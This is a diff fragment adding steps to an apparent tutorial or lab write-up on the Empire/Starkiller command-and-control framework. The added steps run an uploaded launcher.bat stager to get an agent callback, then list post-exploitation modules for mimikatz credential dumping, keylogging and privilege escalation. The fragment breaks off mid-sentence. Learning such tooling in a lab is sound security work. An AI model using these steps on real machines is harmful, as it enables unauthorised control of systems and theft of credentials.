@@ -95,3 +95,18 @@ upload ~/Documents/launcher.bat
 ```
 
 we could have also used `wget` or `curl` or a different route to get the batch file into the remote machine
+
+once uploaded, i just entered shell and ran the batch script. check Starkiller for agent callback
+```bash
+shell
+launcher.bat
+```
+
+now that we have an agent we can run all sorts of commands and modules. lets take a look at a few modules
++ powershell/credentials/mimikatz/command
++ powershell/collection/keylogger
++ powershell/privesc/winPEAS
++ powershell/trollsploit/voicetroll
+
+we can also add new plugins to Empire
+simply download and transfer a plugin.py file to the /
